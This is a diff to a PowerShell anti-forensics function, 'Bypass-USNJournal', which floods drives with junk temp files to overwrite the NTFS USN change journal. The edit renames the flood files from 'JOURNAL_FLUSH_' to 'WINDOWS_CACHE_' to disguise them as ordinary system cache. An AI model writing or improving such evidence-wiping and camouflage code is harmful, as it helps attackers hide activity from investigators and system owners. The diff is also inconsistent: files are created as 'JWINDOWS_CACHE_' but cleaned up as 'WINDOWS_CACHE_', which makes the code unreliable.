@@ -679,7 +679,7 @@ function Bypass-USNJournal {
             $tempFiles = @()
             for ($i = 0; $i -lt $FloodCount; $i++) {
                 $guid = [guid]::NewGuid().ToString()
-                $tempName = "$driveLetter`:\JOURNAL_FLUSH_$guid.tmp"
+                $tempName = "$driveLetter`:\JWINDOWS_CACHE_$guid.tmp"
                 try {
                     [System.IO.File]::WriteAllBytes($tempName, (New-Object byte[] $FileSize))
                     $created++
@@ -708,7 +708,7 @@ function Bypass-USNJournal {
         # --- Cleanup temp files (if requested) ---
         if ($DeleteTempFiles) {
             Write-Host "    Cleaning up temporary files on $driveLetter... " -NoNewline
-            $pattern = "$driveLetter`:\JOURNAL_FLUSH_*.tmp"
+            $pattern = "$driveLetter`:\WINDOWS_CACHE_*.tmp"
             $files = Get-ChildItem -Path $pattern -File -ErrorAction SilentlyContinue
             if ($files) {
                 $removed = 0
@@ -741,7 +741,7 @@ function Bypass-USNJournal {
         if ($DeleteTempFiles) {
             Write-Host "[*] Temporary files have been deleted." -ForegroundColor Green
         } else {
-            Write-Host "[*] Temporary files remain at: X:\JOURNAL_FLUSH_*.tmp" -ForegroundColor Yellow
+            Write-Host "[*] Temporary files remain at: X:\WINDOWS_CACHE_*.tmp" -ForegroundColor Yellow
         }
     } else {
         Write-Host "[✗] USN Journal bypass failed on all targeted drives." -ForegroundColor Red
